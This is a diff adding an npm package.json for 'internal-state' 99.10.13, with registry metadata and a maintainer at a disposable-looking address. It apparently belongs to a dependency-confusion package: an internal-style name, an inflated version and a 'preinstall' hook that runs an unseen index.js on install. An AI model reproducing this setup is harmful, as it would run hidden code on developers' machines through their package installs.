@@ -1,0 +1,39 @@
+{
+    "name": "internal-state",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "internal-state@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-Wu461IbTFDFArzxL+2z/j5wfSIoZl7iHCnTC7S7wsbR5YUgWLLwTbHswdRCiasAGZRAZNMCnNS5ozInpHkfvJQ==",
+        "shasum": "8860846d69bff21cb05f8f6f2af5b711c1e8e751",
+        "tarball": "https://registry.npmjs.org/internal-state/-/internal-state-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5072,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXQACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpnaBAAjN98ylBBvAeNyD1NawsUj/D0xgxmzOmppKTNCSqQ5AcJr6UK\r\nXqJM0YmMWU/0Q1n41f7yL7MOt3Fq16OkgyuPX2spfKieRr57/srQP5s2Vgmn\r\nQnGKlv7idqjCLCkHP86cz2XlrVseZ+738CuvVEG644uaUEeq+hPehioP+gRB\r\nJrDsbHUKCgR0kHH0YvoLgwF97yjnw+4WuNu6Y30WA53s8IpyFtK2ACXgUI1y\r\nelMfqPduz7oz+nGXXs4h+b2dWPuohE9fOQ1dYCRccYtIpMvWtGmUd62VY9rq\r\nPpMTw8/FLYgjq7wTSy3uY5z5wDWzwD47anrY4k4SwNfxed9rrnd6UvD9WO3Z\r\n6IKphdqcfnmtoHrxQmwqzwTVPaFUuEa7wrqo1wEeN7bXuETYBbQOEknSNJpT\r\nZ4yHDS8zdo8Tqtxi0SbNx2iCQQx2/wGN56drjPImj+YtKpk3pP3OLko8w9Kw\r\ndUJADFGP9yrCmjxVl/k2Y7uabF8wq15vUsfG7zy22ppdXQkjLHV0zoiyeE5h\r\nv7t75cQPu6xrO2XX7vuwP7mvV6XOosGe4ZkgcegbGjIzm5W6hmXCSqYMllya\r\nAFRIbXhN9q+jpfeVSeqEv/kWoiw629NHr0pPg1qsBE5SI7F2TH1+dWsOzPiW\r\nk7z7YfiWHfBMDkfrtiul3TP7U48Qdl7uP6M=\r\n=FIB6\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "mfpmx4vd",
+        "email": "mfpmx4vd@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "mfpmx4vd",
+            "email": "mfpmx4vd@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/internal-state_99.10.13_1648420304610_0.5851306358163713"
+    },
+    "_hasShrinkwrap": false
+}
